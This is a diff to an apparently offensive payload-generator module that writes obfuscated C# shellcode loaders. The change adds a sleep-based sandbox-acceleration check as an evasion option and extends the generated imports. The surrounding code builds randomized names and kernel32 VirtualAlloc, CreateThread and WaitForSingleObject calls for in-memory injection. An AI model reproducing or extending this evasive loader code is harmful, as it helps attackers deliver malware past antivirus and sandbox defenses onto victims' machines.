@@ -48,7 +48,8 @@ class PayloadModule:
                                     "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                     "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                     "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
-                                    "USERNAME"       : ["X", "Optional: The required user account"]
+                                    "USERNAME"       : ["X", "Optional: The required user account"],
+                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                 }
 
     def generate(self):
@@ -87,7 +88,7 @@ class PayloadModule:
         y = [evasion_helpers.randomString() for x in range(17)]
 
         #required syntax at the beginning of any/all payloads
-        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
+        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading;\n"
         payload_code += "namespace %s { class %s  {\n" % (namespaceName, className)
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
